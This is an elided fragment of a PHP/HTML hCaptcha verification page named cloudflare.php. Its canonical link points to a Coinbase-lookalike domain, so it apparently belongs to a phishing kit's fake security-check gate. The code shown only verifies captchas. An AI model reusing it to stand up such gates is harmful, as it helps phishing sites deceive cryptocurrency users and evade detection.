...
try {
    ...
    error_log("Database error in cloudflare.php: " . $e->getMessage());
}
...
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['h-captcha-response'])) {
    ...
    $secret_key = 'YOUR_HCAPTCHA_SECRET_KEY_HERE'; // Replace with your hCaptcha secret key
    $verify_url = 'https://hcaptcha.com/siteverify';
    
    $data = [
        'secret' => $secret_key,
        'response' => $captcha_response,
        'sitekey' => '0ee059f4-014c-48c0-892a-522efba62116',
    ...
    if ($result !== false) {
        ...
        error_log("hCaptcha Response: " . print_r($response, true));
...
<head>
    ...
    <link rel="canonical" href="https://238911coinbase.com/hcaptcha">
...
<body cz-shortcut-listen="true">
    <div class="container">
        <form method="POST" action="">
            ...
            <div class="h-captcha" 
                 data-sitekey="0ee059f4-014c-48c0-892a-522efba62116" 
                 data-theme="dark" 
    ...
    <script>
        function onCaptchaSolved(response) {
            ...
            // Automatically submit the form when captcha is solved
